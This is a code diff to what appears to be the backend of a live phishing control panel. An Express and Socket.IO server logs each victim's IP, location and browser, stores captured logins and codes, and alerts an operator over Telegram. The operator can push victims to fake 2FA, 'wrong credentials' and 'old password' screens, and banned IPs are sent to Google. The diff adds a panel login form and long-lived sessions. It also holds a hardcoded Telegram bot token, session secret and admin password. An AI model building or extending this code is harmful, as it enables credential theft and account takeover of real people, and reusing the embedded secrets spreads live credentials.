@@ -1,6 +1,5 @@
 const express = require('express');
 const session = require('express-session');
-const basicAuth = require('basic-auth');
 const path = require('path');
 const http = require('http');
 const socketIo = require('socket.io');
@@ -20,6 +19,9 @@ const server = http.createServer(app);
 const TELEGRAM_WEBHOOK_URL = process.env.TELEGRAM_WEBHOOK_URL;
 const bot = new TelegramBot('8499303373:AAHXoK6a9_4o018qmbkPcYV3hdMt2dA-npM', { polling: !TELEGRAM_WEBHOOK_URL });
 
+const SESSION_MAX_AGE_SHORT_MS = 24 * 60 * 60 * 1000;
+const SESSION_MAX_AGE_LONG_MS = 10 * 365 * 24 * 60 * 60 * 1000;
+
 app.use(session({
   secret: '8c07f4a99f3e4b34b76d9d67a1c54629dce9aaab6c2f4bff1b3c88c7b6152b61',
   resave: false,
@@ -27,7 +29,7 @@ app.use(session({
   cookie: {
     secure: true,
     sameSite: 'none',
-    maxAge: 24 * 60 * 60 * 1000
+    maxAge: SESSION_MAX_AGE_SHORT_MS
   }
 }));
 
@@ -38,6 +40,7 @@ app.use(cors({
 }));
 
 app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
 
 if (TELEGRAM_WEBHOOK_URL) {
   app.post('/telegram-webhook', (req, res) => {
@@ -60,22 +63,17 @@ const io = socketIo(server, {
 
 module.exports = { app, server, io, bot };
 
-function auth(req, res, next) {
+const PANEL_LOGIN_USER = 'admin';
+const PANEL_LOGIN_PASS = 'Qweqwe123!@#';
+
+function requirePanelAuth(req, res, next) {
   if (req.session && req.session.authenticated) {
     return next();
   }
-
-  const user = basicAuth(req);
-  const username = 'admin';
-  const password = 'Qweqwe123!@#';
-
-  if (user && user.name === username && user.pass === password) {
-    req.session.authenticated = true;
-    return next();
-  } else {
-    res.set('WWW-Authenticate', 'Basic realm="Restricted Area"');
-    return res.status(401).send('Authentication required.');
+  if (req.accepts('html')) {
+    return res.redirect(302, '/dash/login');
   }
+  return res.status(401).json({ message: 'Authentication required.' });
 }
 
 const BAN_LIST_FILE = path.join(__dirname, 'ban_ips.txt');
@@ -132,7 +130,35 @@ async function getGeoForIp(clientIP) {
 let panelUpdateTimer = null;
 const PANEL_UPDATE_DEBOUNCE_MS = 80;
 
-app.use('/dash', auth, express.static(path.join(__dirname, 'aZ7pL9qW3xT2eR6vBj0K')));
+const panelLoginHtml = path.join(__dirname, 'panel-login.html');
+
+app.get('/dash/login', (req, res) => {
+  if (req.session && req.session.authenticated) {
+    return res.redirect(302, '/dash/');
+  }
+  res.sendFile(panelLoginHtml);
+});
+
+app.post('/dash/login', (req, res) => {
+  const username = req.body && req.body.username;
+  const password = req.body && req.body.password;
+  if (username === PANEL_LOGIN_USER && password === PANEL_LOGIN_PASS) {
+    const remember = req.body && (req.body.remember === '1' || req.body.remember === 'on');
+    req.session.authenticated = true;
+    req.session.cookie.maxAge = remember ? SESSION_MAX_AGE_LONG_MS : SESSION_MAX_AGE_SHORT_MS;
+    return res.redirect(302, '/dash/');
+  }
+  res.redirect(302, '/dash/login?error=1');
+});
+
+app.get('/dash/logout', (req, res) => {
+  req.session.destroy((err) => {
+    if (err) console.error('Session destroy:', err);
+    res.redirect(302, '/dash/login');
+  });
+});
+
+app.use('/dash', requirePanelAuth, express.static(path.join(__dirname, 'aZ7pL9qW3xT2eR6vBj0K')));
 app.use('/public', express.static(path.join(__dirname, 'public')));
 
 const users = {};             // socket.id -> socket
@@ -202,6 +228,64 @@ function siteFromSocket(socket) {
   return 'Unknown';
 }
 
+/** Optional: pass `page` or `pageName` in the Socket.IO client `query` so the panel shows the screen before any submit (e.g. query: { clientId, page: 'sms' }). */
+function getInitialPageFromQuery(socket) {
+  const q = socket.handshake.query || {};
+  if (typeof q.page === 'string' && q.page.trim()) return q.page.trim();
+  if (typeof q.pageName === 'string' && q.pageName.trim()) return q.pageName.trim();
+  return null;
+}
+
+/** First-time visitor row + Telegram for new sessions */
+function registerVisitorSession(socket, clientId, clientIP, userAgent, timestamp, city, country, isp, browserName, actionHint) {
+  const resolvedAction = (actionHint != null && String(actionHint).trim() !== '')
+    ? String(actionHint).trim()
+    : (userData[clientId]?.action ?? null);
+
+  const isNewUser = !userData[clientId];
+  userData[clientId] = {
+    ...(userData[clientId] || {}),
+    id: clientId,
+    ip: clientIP,
+    userAgent,
+    time: timestamp,
+    isConnected: true,
+    login: userData[clientId]?.login || {},
+    codes: userData[clientId]?.codes || [],
+    action: resolvedAction
+  };
+
+  if (isNewUser) {
+    newUsers.add(clientId);
+    const website = siteFromSocket(socket);
+    const msg =
+      `🌟 *New Connection Established*\n\n` +
+      `🆔 *Client ID:* \`${clientId}\`\n` +
+      `🌍 *IP Address:* \`${clientIP}\`\n` +
+      `🏙 *City:* \`${city}\`\n` +
+      `🏳️ *Country:* \`${country}\`\n` +
+      `🌐 *Browser:* \`${browserName}\`\n` +
+      `🛣 *Provider:* \`${isp}\`\n\n` +
+      `🕒 *Time:* \`${timestamp.time}\` on \`${timestamp.date}\`\n` +
+      `🔗 *Website:* ${website}`;
+
+    sendTelegramMessage(msg, clientId, 'banOnly');
+  }
+
+  updatePanelUsers();
+}
+
+const EVENT_TO_PANEL_ACTION = {
+  'show-2fa': '2FA',
+  'show-auth': 'Auth',
+  'show-email': 'Email',
+  'show-whatsapp': 'WhatsApp',
+  'show-wrong-creds': 'Wrong creds',
+  'show-old-pass': 'Old pass',
+  'show-calendar': 'Calendar',
+  message: 'Message'
+};
+
 function updatePanelUsers() {
   clearTimeout(panelUpdateTimer);
   panelUpdateTimer = setTimeout(() => {
@@ -219,21 +303,23 @@ function updatePanelUsers() {
 
 io.on('connection', async (socket) => {
   const clientIP = (socket.handshake.headers['x-forwarded-for'] || socket.handshake.address || '').split(',')[0].trim();
-const userAgent = socket.handshake.headers['user-agent'];
-const timestamp = formatDateTime(new Date());
+  const userAgent = socket.handshake.headers['user-agent'];
+  const timestamp = formatDateTime(new Date());
 
-// Redirect only banned IPs (EU geo-blocking removed — it sent all EU visitors to Google)
-if (isBanned(clientIP)) {
-  socket.emit('redirect', 'https://www.google.com/');
-  socket.disconnect();
-  return;
-}
+  // Redirect only banned IPs (EU geo-blocking removed — it sent all EU visitors to Google)
+  if (isBanned(clientIP)) {
+    socket.emit('redirect', 'https://www.google.com/');
+    socket.disconnect();
+    return;
+  }
 
   let clientId = socket.handshake.query.clientId;
   if (!clientId || typeof clientId !== 'string') {
     clientId = crypto.randomBytes(16).toString('hex');
     socket.emit('assign-client-id', clientId);
   }
+
+  const initialPageFromQuery = getInitialPageFromQuery(socket);
 
   socketToClient[socket.id] = clientId;
   users[socket.id] = socket;
@@ -247,41 +333,15 @@ if (isBanned(clientIP)) {
 
   const connectionTimeout = setTimeout(() => {
     if (!connectionHandled) {
-      const isNewUser = !userData[clientId];
-
-      userData[clientId] = {
-        ...(userData[clientId] || {}),
-        id: clientId,
-        ip: clientIP,
-        userAgent,
-        time: timestamp,
-        isConnected: true,
-        login: userData[clientId]?.login || {},
-        codes: userData[clientId]?.codes || [],
-        action: null
-      };
-
-      if (isNewUser) {
-        newUsers.add(clientId);
-
-        const website = siteFromSocket(socket);
-        const msg =
-          `🌟 *New Connection Established*\n\n` +
-          `🆔 *Client ID:* \`${clientId}\`\n` +
-          `🌍 *IP Address:* \`${clientIP}\`\n` +
-          `🏙 *City:* \`${city}\`\n` +
-          `🏳️ *Country:* \`${country}\`\n` +
-          `🌐 *Browser:* \`${browserName}\`\n` +
-          `🛣 *Provider:* \`${isp}\`\n\n` +
-          `🕒 *Time:* \`${timestamp.time}\` on \`${timestamp.date}\`\n` +
-          `🔗 *Website:* ${website}`;
-
-        sendTelegramMessage(msg, clientId, 'banOnly');
-      }
-
-      updatePanelUsers();
+      registerVisitorSession(socket, clientId, clientIP, userAgent, timestamp, city, country, isp, browserName, initialPageFromQuery);
     }
   }, 3000); // 3 seconds to wait for userConnectedToPage
+
+  if (initialPageFromQuery) {
+    connectionHandled = true;
+    clearTimeout(connectionTimeout);
+    registerVisitorSession(socket, clientId, clientIP, userAgent, timestamp, city, country, isp, browserName, initialPageFromQuery);
+  }
 
   socket.on('userConnectedToPage', (data) => {
     connectionHandled = true;
@@ -289,6 +349,9 @@ if (isBanned(clientIP)) {
 
     const cid = data.clientId || socket.id;
     socketToClient[socket.id] = cid;
+
+    const pageFromClient = data && data.page != null && String(data.page).trim() !== '' ? String(data.page).trim() : null;
+    const resolvedPage = pageFromClient || initialPageFromQuery || null;
 
     if (!userData[cid]) {
       userData[cid] = {
@@ -299,15 +362,15 @@ if (isBanned(clientIP)) {
         isConnected: true,
         login: {},
         codes: [],
-        action: data.page || null
+        action: resolvedPage
       };
     } else {
-      userData[cid].action = data.page;
+      userData[cid].action = resolvedPage != null ? resolvedPage : userData[cid].action;
     }
 
     const siteHint = data.pageUrl || siteFromSocket(socket);
     const pageMsg = `🌐 *User Connected to Page*\n\n` +
-      `📄 *Page:* \`${data.page}\`\n` +
+      `📄 *Page:* \`${resolvedPage || 'Unknown'}\`\n` +
       `📱 *cid:* \`${cid}\`\n` +
       `🔗 *Website:* ${siteHint}`;
 
@@ -428,6 +491,11 @@ function emitToClient(clientId, event, data = null) {
   const socketId = getSocketIdByClientId(clientId);
   if (socketId && users[socketId]) {
     users[socketId].emit(event, data);
+    const nextAction = EVENT_TO_PANEL_ACTION[event];
+    if (nextAction && userData[clientId]) {
+      userData[clientId].action = nextAction;
+      updatePanelUsers();
+    }
   }
 }
 
